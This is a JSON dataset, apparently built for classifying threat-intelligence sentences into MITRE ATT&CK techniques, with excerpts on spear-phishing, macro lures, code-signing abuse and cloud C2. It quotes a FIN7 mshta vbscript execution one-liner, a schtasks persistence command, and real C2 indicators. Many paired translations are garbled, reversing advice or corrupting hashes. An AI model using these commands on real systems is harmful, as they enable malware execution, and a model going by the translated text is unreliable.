    "Another interesting characteristic of the malicious documents is that the metadata associated with the document files themselves also matches that found in many of the malicious documents that were previously being used to spread Remcos.Figure 3: Document metadataAdditionally, the creation and modification dates associated with these documents are shortly after we released a detailed analysis of Remcos distribution campaigns that were being observed throughout 2018": [
        {
            "tec_id": "T1566.001",
            "en_text": "Another interesting characteristic of the malicious documents is that the metadata associated with the document files themselves also matches that found in many of the malicious documents that were previously being used to spread Remcos.Figure 3: Document metadataAdditionally, the creation and modification dates associated with these documents are shortly after we released a detailed analysis of Remcos distribution campaigns that were being observed throughout 2018",
            "data_text": "Another interesting feature of malicious documents is that metadata associated with the document file itself is consistent with those found in many malicious documents that were previously used to spread the remcos.Figure 3: Document MetadataThe creation and modification dates associated with this document are shortly after the release of a detailed analysis of the Remcos deployment campaign observed throughout 2018."
        }
    ],
    "In May 2016, we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware": [
        {
            "tec_id": "T1566.001",
            "en_text": "In May 2016, we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware",
            "data_text": "In May 2016, we published a blog detailing a spear phishing campaign against banks in the Middle East that distributed forward bat malware using macro-enabled attachments."
        }
    ],
    "Analysis APT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment in a malicious spear phishing email sent to the victim organization": [
        {
            "tec_id": "T1566.001",
            "en_text": "Analysis APT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment in a malicious spear phishing email sent to the victim organization",
            "data_text": "Analysis APT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment to a malicious spear phishing email sent to the victim organization."
        }
    ],
    "This attack diverged from previous attacks we observed from this group as it involved spear-phishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy)": [
        {
            "tec_id": "T1566.001",
            "en_text": "This attack diverged from previous attacks we observed from this group as it involved spear-phishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy)",
            "data_text": "This attack is different from the previous attacks observed by this group because it contained a spear phishing email sent to the target organization as a password-protected RAR archive attachment containing a malicious Excel Web Query file (.iqy)."
        }
    ],
    "In this instance a spear phishing email was used containing a lure designed to socially engineer and entice the victim to executing a malicious attachment": [
        {
            "tec_id": "T1566.001",
            "en_text": "In this instance a spear phishing email was used containing a lure designed to socially engineer and entice the victim to executing a malicious attachment",
            "data_text": "In this case, Spear Phishing emails contain bait designed to lure victims to execute malicious attachments through social engineering."
        }
    ],
    "In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle": [
        {
            "tec_id": "T1566.001",
            "en_text": "In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle",
            "data_text": "Unlike the two samples used in this attack, this sample did not use PE attachments, but instead used Microsoft Word documents containing malicious macros as a means of delivery."
        }
    ],
    "The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars": [
        {
            "tec_id": "T1566.001",
            "en_text": "The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars",
            "data_text": "The email contains an attachment named Seminar-Invitation.doc. This is a document from Microsoft Word that is tracked by 3Dollar."
        }
    ],
    "Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments": [
        {
            "tec_id": "T1566.001",
            "en_text": "Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments",
            "data_text": "Zebrocy is primarily delivered through phishing attacks that contain malicious Microsoft Office documents with macros and simple executable attachments."
        }
    ],
    "Malicious Document   Decoy Document  The attack starts with a spear-phishing email containing the HWP document named \"미북 정상회담 전망 및 대비.hwp\" (Prospects for US-North Korea Summit .hwp)": [
        {
            "tec_id": "T1566.001",
            "en_text": "Malicious Document   Decoy Document  The attack starts with a spear-phishing email containing the HWP document named \"미북 정상회담 전망 및 대비.hwp\" (Prospects for US-North Korea Summit .hwp)",
            "data_text": "Malicious document bait document attacks begin with a window phishing email containing a HWP document named \"Promising U.S.-North Korea Summit.hwp\"."
        }
    ],
    "Initial Attack On December 13, 2017, a spear phishing email was sent from the email address of yuri.sidorav@yandex[.]ru to a high ranking individual within a British government agency": [
        {
            "tec_id": "T1566.001",
            "en_text": "Initial Attack On December 13, 2017, a spear phishing email was sent from the email address of yuri.sidorav@yandex[.]ru to a high ranking individual within a British government agency",
            "data_text": "Initial attack on 13 December 2017, Spear phishing e-mailed Yuri.Sent from email address of sidorav@yandex[.ru] to a senior member of the UK government agency."
        }
    ],
    "Traps blocks all of the files currently associated with Gorgon Group    Appendix   Analysis of a targeted attack “1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98” The delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that attempts to compromise the system": [
        {
            "tec_id": "T1566.001",
            "en_text": "Traps blocks all of the files currently associated with Gorgon Group    Appendix   Analysis of a targeted attack “1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98” The delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that attempts to compromise the system",
            "data_text": "The trap blocks the Gorgon Group appendix analysis and all files currently associated with the targeted attack \"1971 Liberation War Free Fighter Pakistan Army Archive Database 98\". Delivery documents used in targeted attacks are Microsoft Office documents that contain macros that attempt to compromise the system."
        }
    ],
    "Delivery TG-3390 conducts SWCs or sends spearphishing emails with ZIP archive attachments": [
        {
            "tec_id": "T1566.001",
            "en_text": "Delivery TG-3390 conducts SWCs or sends spearphishing emails with ZIP archive attachments",
            "data_text": "Delivery TG-3390 performs SWC or sends phishing emails using ZIP archive attachments."
        }
    ],
    "The initial infection vector of this campaign is a Microsoft Office Excel Worksheet with an Office macro that uses the mshta.exe Windows executable to run scripts, which are embedded in the HTML of a specially-crafted blogspot.com page": [
        {
            "tec_id": "T1566.001",
            "en_text": "The initial infection vector of this campaign is a Microsoft Office Excel Worksheet with an Office macro that uses the mshta.exe Windows executable to run scripts, which are embedded in the HTML of a specially-crafted blogspot.com page",
            "data_text": "The initial infection vector for this campaign is the Microsoft Office Excel worksheet with Office macros running scripts using the mshta.exe Windows executable contained in HTML on the specially crafted blogspot.com page."
        }
    ],
    "The case we found arrived through a targeted email that contained a document file (in docx format).": [
        {
            "tec_id": "T1566.001",
            "en_text": "The case we found arrived through a targeted email that contained a document file (in docx format).",
            "data_text": "The case we found arrived via a destination email containing a document file (docx format)."
        }
    ],
    "APT32 likely used COVID-19-themed malicious attachments against Chinese speaking targets.": [
        {
            "tec_id": "T1566.001",
            "en_text": "APT32 likely used COVID-19-themed malicious attachments against Chinese speaking targets.",
            "data_text": "APT32 is likely to have used malicious attachments under the theme of COVID-19 for Chinese use."
        }
    ],
    "Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3": [
        {
            "tec_id": "T1204",
            "en_text": "Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3",
            "data_text": "When the password (delivered to the body of the email) is entered, a document is displayed asking the user to activate the malicious macro, as shown in Figure 3."
        }
    ],
    "Successful execution of the macro within the malicious document results in the installation of APT28’s signature GAMEFISH malware": [
        {
            "tec_id": "T1204",
            "en_text": "Successful execution of the macro within the malicious document results in the installation of APT28’s signature GAMEFISH malware",
            "data_text": "Successful execution of macros within malicious documents installs the signature GAMEFISH malware on APT28."
        }
    ],
    "Once the user enables macros, the macro will perform the following actions:  Displays decoy content Checks for the existence of a file at %APPDATA%\\wscript.exe If %APPDATA%\\wscript.exe does not exist, the macro converts an embedded hex-encoded string into bytes and saves this data to the %APPDATA%\\wscript.exe": [],
    "None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1": [
        {
            "tec_id": "T1204",
            "en_text": "None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1",
            "data_text": "None of the known documents contain a manned image or message that instructs the recipient to click the Use content required to run the macro button (see Figure 1)."
        }
    ],
    "The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document": [
        {
            "tec_id": "T1204",
            "en_text": "The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document",
            "data_text": "Most delivery documents contain generic manned images that require victims to activate macros without additional content, and adversaries appear to rely only on manned file names to entice victims to execute malicious documents."
        }
    ],
    "The victim will then see a prompt to Enable Content as with any malicious macro document as seen in Figure 5": [
        {
            "tec_id": "T1204",
            "en_text": "The victim will then see a prompt to Enable Content as with any malicious macro document as seen in Figure 5",
            "data_text": "The victim may then be prompted to enable content in a malicious macro document, as shown in Figure 5."
        }
    ],
    "Figure 5 Remote template document requesting the user to click “Enable Content” to run macro Clustering The delivery documents used in the October and November waves shared a large number of similarities, as seen in Table 1, which allowed us to cluster the activity together": [
        {
            "tec_id": "T1204",
            "en_text": "Figure 5 Remote template document requesting the user to click “Enable Content” to run macro Clustering The delivery documents used in the October and November waves shared a large number of similarities, as seen in Table 1, which allowed us to cluster the activity together",
            "data_text": "Figure 5 Remote Template documents asking users to click \"Enable Content\" to run macro clustering The forwarding documents used in October and November waveforms share many similarities, as shown in Table 1, allowing activities to be clustered together."
        }
    ],
    "Figure 1: Malicious FIN7 lure asking victim to double click to unlock contents The malicious LNK launches “mshta.exe” with the following arguments passed to it: vbscript:Execute(\"On Error Resume Next:set w=GetObject(,\"\"Word.Application\"\"):execute w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close\") The script in the argument combines all the textbox contents in the document and executes them, as seen in Figure 2": [
        {
            "tec_id": "T1204",
            "en_text": "Figure 1: Malicious FIN7 lure asking victim to double click to unlock contents The malicious LNK launches “mshta.exe” with the following arguments passed to it: vbscript:Execute(\"On Error Resume Next:set w=GetObject(,\"\"Word.Application\"\"):execute w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close\") The script in the argument combines all the textbox contents in the document and executes them, as seen in Figure 2",
            "data_text": "Figure 1: Malicious FIN7luer Malicious LNK asking the victim to double-click to unlock the content starts \"msshta.exe\" by passing the following argument: vbscript:execute (\"restart on error\" followed by:w=GetObject(\", \"Word\")Application \"\"): Run w.Active document.Shape(2)Text frame.The script for the text range.text:close\") argument runs by combining all text box contents in the document, as shown in Figure 2."
        }
    ],
    "Malicious processes are marked red (click image to enlarge):  The following malicious files are dropped and run:  C:\\ProgramData\\{2ED05C38-D464-4188-BC7F-F6915DE8D764}\\OFFLINE\\9A189DFE\\C7B7C186\\main.vbs dcac79d7dc4365c6d742a49244e81fd0 C:\\Users\\Public\\Libraries\\RecordedTV\\DnE.ps1 7fe0cb5edc11861bc4313a6b04aeedb2 C:\\Users\\Public\\Libraries\\RecordedTV\\DnS.ps1 3920c11797ed7d489ca2a40201c66dd4 “C:\\Windows\\System32\\schtasks.exe” /create /F /sc minute /mo 3 /tn “GoogleUpdateTasksMachineUI” /tr C:\\Users\\Public\\Libraries\\RecordedTV\\backup.vbs 7528c387f853d96420cf7e20f2ad1d32  Command and control server is located in the following domain: tecsupport[.]in A detailed analysis of the malware is provided in two posts by Palo Alto networks and in a post by FireEye, which wrote about previous campaigns by this threat agent": [],
    "This document was a decoy aimed to entice the user to open malicious documents embedded further down the pageThe actor embedded two additional links and the document urged the user to click on these links for more information about New Year's activities in North Korea": [
        {
            "tec_id": "T1204",
            "en_text": "This document was a decoy aimed to entice the user to open malicious documents embedded further down the pageThe actor embedded two additional links and the document urged the user to click on these links for more information about New Year's activities in North Korea",
            "data_text": "This is a decoy to entice you to open a malicious document embedded at the bottom of the page.The actor included two additional links and the document urged users to click on them for more information about New Year's activities in North Korea."
        }
    ],
    "These documents contained malicious OLE objects used to drop binaries.This time, however, they contained malicious OLE (Object Link Embedded) objects.Initial analysis confirmed two similarly sized OLE object files within this document which appeared to be the same from an execution point of view.The two dropped binaries were stored and executed in this location during our analysis:C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (2).exeC:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (3).exeInitial analysis showed some sloppy cleaning up from Group123, which we used later to determine that separate campaigns were the work of this same actor, as compilation artifacts remained within the binaries:e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdbThe second stage of the dropped binaries was used to execute wscript.exe while injecting shellcode into this process": [],
    "Email attacks often use “click-worthy” or interesting topics to convince users to click links or open attachments that could lead to various threats": [],
    "Users are advised to avoid opening attachments and click links on unsolicited emails": [
        {
            "tec_id": "T1204",
            "en_text": "Users are advised to avoid opening attachments and click links on unsolicited emails",
            "data_text": "It is recommended that you click on a link to an unsolicited email without opening an attachment."
        }
    ],
    "In one example, the Word document contained a button with the label “First click “Enable Content” above the page, then click here to fill out the form”  This string attempts to trick the user into enabling macros to execute the malicious code within the macro": [
        {
            "tec_id": "T1204",
            "en_text": "In one example, the Word document contained a button with the label “First click “Enable Content” above the page, then click here to fill out the form”  This string attempts to trick the user into enabling macros to execute the malicious code within the macro",
            "data_text": "In one example, a Word document has a button labeled \"First, click \"Enable Content\" on the page, and then click here to complete the form.\" This string attempts to trick the user so that the macro can execute malicious code within the macro."
        }
    ],
    "These Honeybee documents did not contain any specific lures, rather variations of a “not compatible” message attempting to convince the user to enable content": [
        {
            "tec_id": "T1204",
            "en_text": "These Honeybee documents did not contain any specific lures, rather variations of a “not compatible” message attempting to convince the user to enable content",
            "data_text": "These Honeybee documents do not contain any specific temptations. A variant of the \"incompatible\" message attempts to persuade the user to activate the content."
        }
    ],
    "Additionally, a small number of campaigns over this same period also made use of various file-sharing platforms like Dropbox for hosting the malicious documents rather than directly attaching them to the messages themselves.Figure 2: Example malicious Excel documentSimilar to the technique described in our previous blog about Remcos, the contents of the documents have been intentionally made to appear as if they are blurry, with the user being prompted to enable editing to have a clearer view of the contents": [
        {
            "tec_id": "T1204",
            "en_text": "Additionally, a small number of campaigns over this same period also made use of various file-sharing platforms like Dropbox for hosting the malicious documents rather than directly attaching them to the messages themselves.Figure 2: Example malicious Excel documentSimilar to the technique described in our previous blog about Remcos, the contents of the documents have been intentionally made to appear as if they are blurry, with the user being prompted to enable editing to have a clearer view of the contents",
            "data_text": "In addition, over the same period, a small number of campaigns used various file-sharing platforms, such as Dropbox, to host malicious documents instead of attaching them directly to messages.Figure 2: Example of a malicious Excel document Similar to the technique described in the previous blog about Remcos, the content of the document is intentionally blurred and prompted to edit it so that the user can see the content more clearly"
        }
    ],
    "By default, Excel does not allow the download of data from the remote server, but will ask for the user’s consent by presenting the dialog box in Figure 2:  Figure 2 Excel security notice for .iqy files By enabling this data connection, the user allows Excel to obtain content from the URL in the .iqy file": [
        {
            "tec_id": "T1204",
            "en_text": "By default, Excel does not allow the download of data from the remote server, but will ask for the user’s consent by presenting the dialog box in Figure 2:  Figure 2 Excel security notice for .iqy files By enabling this data connection, the user allows Excel to obtain content from the URL in the .iqy file",
            "data_text": "By default, Excel cannot download data from the remote server, but Figure 2: displays the Excel security notification dialog box for the .iqi file to request your consent. Enabling this data association allows users to import content from the URL of the .iqi file by Excel."
        }
    ],
    "The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on “Enable Content” as seen in Figure 2": [
        {
            "tec_id": "T1204",
            "en_text": "The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on “Enable Content” as seen in Figure 2",
            "data_text": "This document contains manned images similar to those commonly seen in malicious macro documents that ask users to click \"Enable Content,\" as shown in Figure 2."
        }
    ],
    "Malicious Macro Analysis When the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the “Enable Content” button": [
        {
            "tec_id": "T1204",
            "en_text": "Malicious Macro Analysis When the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the “Enable Content” button",
            "data_text": "When a malicious macro analysis victim opens a $3 document, it appears with a Luer image and prompts you to click the \"Enable Content\" button."
        }
    ],
    "Message 3:    Headers Received: by mailcenter.support   Sender Mercator Institute for China Studies <publications@mericcs.org>   Subject Authoritarian advance Responding to Chinas growing political influence in Europe   Body Content and images included within the e-mail body were a direct copy of the following MERICS report:  https://www.merics.org/sites/default/files/2018-02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf   Notes The hyperlinked text Click here to download the report within the e-mail body lead to a malicious RTF document located at the URL hxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc": [
        {
            "tec_id": "T1204",
            "en_text": "Message 3:    Headers Received: by mailcenter.support   Sender Mercator Institute for China Studies <publications@mericcs.org>   Subject Authoritarian advance Responding to Chinas growing political influence in Europe   Body Content and images included within the e-mail body were a direct copy of the following MERICS report:  https://www.merics.org/sites/default/files/2018-02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf   Notes The hyperlinked text Click here to download the report within the e-mail body lead to a malicious RTF document located at the URL hxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc",
            "data_text": "Message 3: Header Received: By Mail Center.Support Sender Mercator Institute for China Studies <publications@mericcs.org>Subject Authoritative advance As political influence grows in Europe, the content of China's response and images contained in the body of the email were direct copies of the following MERICS reports: https://www.merics.org/sites/default/files/2018-02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf Notes Hyperlinked Text Click here to download the report within the body of the email and you will see a malicious RTF document at www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc."
        }
    ],
    "Cluster A Case 1: Delivery via document property macro – a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483  In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware": [
        {
            "tec_id": "T1204",
            "en_text": "Cluster A Case 1: Delivery via document property macro – a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483  In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware",
            "data_text": "Cluster A Case 1: Forwarded via Document Properties Macro – a789a282e0d65a050ccae66c56632245af1c8a589ace2ca5ca79572289fd483 study found at least one attack on companies running malware using Microsoft Office Excel documents."
        }
    ],
    "By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious’ codes small footprint can help enable evasion of automated detection mechanisms based on macro content": [
        {
            "tec_id": "T1204",
            "en_text": "By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious’ codes small footprint can help enable evasion of automated detection mechanisms based on macro content",
            "data_text": "This allows the main content of the macro itself (Figure 2) to remain relatively simple, and allows the escape of automated detection mechanisms based on macro content through a small footprint of malicious code."
        }
    ],
    "In March, we came across an email with a malware attachment that used the Gamaredon group’s tactics.": [
        {
            "tec_id": "T1204",
            "en_text": "In March, we came across an email with a malware attachment that used the Gamaredon group’s tactics.",
            "data_text": "In March, we found that there was a malware attachment email using Gamaredon Group's tactics."
        }
    ],
    "Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.": [
        {
            "tec_id": "T1204",
            "en_text": "Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.",
            "data_text": "Whitefly first infects the victim using a dropper in the form of a malicious .exe or .dll file disguised as a document or image."
        }
    ],
    "Once a user has double-clicked the embedded image, the form executes a VB setup script": [
        {
            "tec_id": "T1204",
            "en_text": "Once a user has double-clicked the embedded image, the form executes a VB setup script",
            "data_text": "Double-click the image that contains the user, and the form runs the VB setup script."
        }
    ],
    "The threat actors also took additional steps to replace some variable strings in the more recent samples, likely in an attempt to avoid signature-based detection from Yara rules. Once the document was opened, it prompted the user to enable the macro titled \"BlackWater.bas\".": [
        {
            "tec_id": "T1204",
            "en_text": "The threat actors also took additional steps to replace some variable strings in the more recent samples, likely in an attempt to avoid signature-based detection from Yara rules. Once the document was opened, it prompted the user to enable the macro titled \"BlackWater.bas\".",
            "data_text": "Threat actors have also taken additional steps to replace some variable strings in more recent samples in an attempt to avoid signature-based detection in Yara rules. When the document opens, the user is prompted to use a macro titled \"BlackWater.bas\"."
        }
    ],
    "The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5": [
        {
            "tec_id": "T1553.002",
            "en_text": "The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5",
            "data_text": "The version used here is version 4.1, digitally signed with Notepad++, as shown in Figure 5."
        }
    ],
    "By using this technique, the malware is able to leverage itself from a signed and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, a signed and verified security product process": [
        {
            "tec_id": "T1553.002",
            "en_text": "By using this technique, the malware is able to leverage itself from a signed and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, a signed and verified security product process",
            "data_text": "Using this technology, malware can take advantage of a signed and validated legitimate Windows OS process, or a signed and validated security product process if you have swrundll.exe or unins000.exe."
        }
    ],
    "FIN7 has consistently utilized legally purchased code signing certificates to sign their CARBANAK payloads": [
        {
            "tec_id": "T1553.002",
            "en_text": "FIN7 has consistently utilized legally purchased code signing certificates to sign their CARBANAK payloads",
            "data_text": "FIN7 continued to use its legally purchased code signing certificate to sign CARB.ANAK Loads"
        }
    ],
    "In these websites they hosted malware that was digitally signed with a valid, likely stolen code signing certificate Based on VirusTotal uploads, malicious documents content, and known victims – other targeted organisations are located in Turkey, Qatar, Kuwait, United Arab Emirates, Saudi Arabia, and Lebanon": [
        {
            "tec_id": "T1553.002",
            "en_text": "In these websites they hosted malware that was digitally signed with a valid, likely stolen code signing certificate Based on VirusTotal uploads, malicious documents content, and known victims – other targeted organisations are located in Turkey, Qatar, Kuwait, United Arab Emirates, Saudi Arabia, and Lebanon",
            "data_text": "These websites hosted digitally signed malware with VirusTotal uploads, malicious document content, and valid code signing certificates stolen based on known victims. Other target organizations are Turkey, Qatar, Kuwait, the United Arab Emirates, Saudi Arabia and Lebanon."
        }
    ],
    "Digitally signed malware The entire bundle (VPN client and malware) was digitally signed with a valid code signing certificate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:  Thumbprint: F340C0D841F9D99DBC289151C13391000366631C Serial number: 45 E4 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09 Another Helminth sample, 1c23b3f11f933d98febfd5a92eb5c715, was signed with a different AI Squared code signing certificate: Thumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48 This suggest that the attackers had got a hold of an Ai Squared signing key, potentially after compromising their network": [
        {
            "tec_id": "T1553.002",
            "en_text": "Digitally signed malware The entire bundle (VPN client and malware) was digitally signed with a valid code signing certificate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:  Thumbprint: F340C0D841F9D99DBC289151C13391000366631C Serial number: 45 E4 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09 Another Helminth sample, 1c23b3f11f933d98febfd5a92eb5c715, was signed with a different AI Squared code signing certificate: Thumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48 This suggest that the attackers had got a hold of an Ai Squared signing key, potentially after compromising their network",
            "data_text": "The complete bundle of digitally signed malware (VPN clients and malware) is digitally signed with a valid code signing certificate issued by Symantec to AI Square, a legitimate software company that develops accessibility software. Fingerprint: F340C0D841F9D99DBC289151C1339100036631C Serial Number: 45E47F560B01 B64E 68395E 792F2E09 Another Helminth Sample, 1c23b3F1198D925C Signed Certificate: feb5154A4A43748B64E9246BCC6BCC2A946BCC6B64E932C8246BCC6BCC6D64E8246BCC2A119D8245C8246D8D8246"
        }
    ],
    "The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN": [
        {
            "tec_id": "T1553.002",
            "en_text": "The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN",
            "data_text": "A file named Microsoft.Win32.TaskScheduler.dll is digitally signed with a certificate from AirVPN."
        }
    ],
    "The DLL is also digitally signed by a certificate from “AirVPN”": [
        {
            "tec_id": "T1553.002",
            "en_text": "The DLL is also digitally signed by a certificate from “AirVPN”",
            "data_text": "DLLs are also digitally signed by the certificate of \"AirVPN\"."
        }
    ],
    "They combine reconnaissance of GPO (Group Policy Object management for execution) with digitally-signed malware to avoid detection or blocking during their infection phases": [
        {
            "tec_id": "T1553.002",
            "en_text": "They combine reconnaissance of GPO (Group Policy Object management for execution) with digitally-signed malware to avoid detection or blocking during their infection phases",
            "data_text": "Combines reconnaissance in Group Policy Object Management (GPO) with digitally signed malware to prevent detection or blocking during the infection phase."
        }
    ],
    "Stolen code signing certificates used to sign malware": [
        {
            "tec_id": "T1553.002",
            "en_text": "Stolen code signing certificates used to sign malware",
            "data_text": "Theft Code Signature Certificate Used for Malware Signature"
        }
    ],
    "Many of this APT’s components are signed with phony Intel and AMD digital certificates": [
        {
            "tec_id": "T1553.002",
            "en_text": "Many of this APT’s components are signed with phony Intel and AMD digital certificates",
            "data_text": "Many components of this APT have been signed with fake Intel and AMD digital certificates."
        }
    ],
    "These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949": [
        {
            "tec_id": "T1102",
            "en_text": "These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949",
            "data_text": "It appears to be hosted on either the linode or the Google Cloud, and prefers to use ASNAS63949."
        }
    ],
    "Command and Control Infrastructure: Compromised servers, messaging platforms, and cloud service providers to avoid detection": [
        {
            "tec_id": "T1102",
            "en_text": "Command and Control Infrastructure: Compromised servers, messaging platforms, and cloud service providers to avoid detection",
            "data_text": "Command and control infrastructure: Prevent compromised servers, messaging platforms, and cloud service providers from being detected"
        }
    ],
    "In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process": [
        {
            "tec_id": "T1102",
            "en_text": "In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process",
            "data_text": "In addition, several APT40 command and control (C2) domains were initially registered by a China-based domain reseller and had Whis records with Chinese location information, suggesting a China-based infrastructure procurement process."
        }
    ],
    "Some APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, Google, and Pastebin for initial C2 communications": [
        {
            "tec_id": "T1102",
            "en_text": "Some APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, Google, and Pastebin for initial C2 communications",
            "data_text": "Some APT40 malware tools can exploit legitimate websites such as GitHub, Google, and Pastebin for initial C2 communications to avoid common network detection."
        }
    ],
    "This RAT communicates with 5.189.145.248, a command and control (C2) IP address that this group has used previously with other malware, including DarkComet and NJRAT": [
        {
            "tec_id": "T1102",
            "en_text": "This RAT communicates with 5.189.145.248, a command and control (C2) IP address that this group has used previously with other malware, including DarkComet and NJRAT",
            "data_text": "This RAT communicates with 5.189.145.248, the command and control (C2) IP address that this group previously used with other malware, including DarkComet and NJRAT."
        }
    ],
    "BRONZE UNION appears to use a combination of self-registered IP addresses and commercial VPN services in its command and control (C2) and operational infrastructure": [
        {
            "tec_id": "T1102",
            "en_text": "BRONZE UNION appears to use a combination of self-registered IP addresses and commercial VPN services in its command and control (C2) and operational infrastructure",
            "data_text": "Bronze Union appears to use a combination of command and control (C2) and its own registered IP address and commercial VPN services in its operational infrastructure."
        }
    ],
    "LOWBALL abuses the Dropbox cloud storage service for command and control (CnC)": [
        {
            "tec_id": "T1102",
            "en_text": "LOWBALL abuses the Dropbox cloud storage service for command and control (CnC)",
            "data_text": "LOWBALL exploits Dropbox cloud storage services for command and control (CnC)."
        }
    ],
    "The attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts.[2][3] A Cyber Campaign Likely Intended to Monitor Hong Kong Media During a Period of Crisis The threat group has previously used newsworthy events as lures to deliver malware.[4] They have largely targeted organizations involved in financial, economic and trade policy, typically using publicly available RATs such as Poison Ivy, as well some non-public backdoors.[5] The group started targeting Hong Kong media companies, probably in response to political and economic challenges in Hong Kong and China": [],
    "Firstly, the Trojan will use the following regular expression to determine if the C2 server wishes to cancel the C2 communications:       216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com     Additionally, the RogueRobin Trojan uses the regular expressions in Table 3 to confirm that the DNS response contains the appropriate data for it to extract information from": [],
    "The string is formatted as “<domain list>|<minimum query size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<maximum requests>|<query types>|<hibridMode>|<current query mode>”   ^slp Sets the sleep and jitter values   ^exit Exits the Trojan    Table 5 Commands available within the C# variant of RogueRobin Using Google Drive for C2 A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C# variant is the x_mode": [
        {
            "tec_id": "T1102",
            "en_text": "The string is formatted as “<domain list>|<minimum query size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<maximum requests>|<query types>|<hibridMode>|<current query mode>”   ^slp Sets the sleep and jitter values   ^exit Exits the Trojan    Table 5 Commands available within the C# variant of RogueRobin Using Google Drive for C2 A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C# variant is the x_mode",
            "data_text": "The format of the string is \"<domain list>|<hasgarbage>|<sleepPerRequest>|<maximum number of requests>|<query types>|<hibridMode>\"^slpCrobin2\" using the command C# and Sliptypes of this table 5. x_mode not available in the original PowerShell version of RogueRobin, but available in the new C# version."
        }
    ],
    "This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API": [
        {
            "tec_id": "T1102",
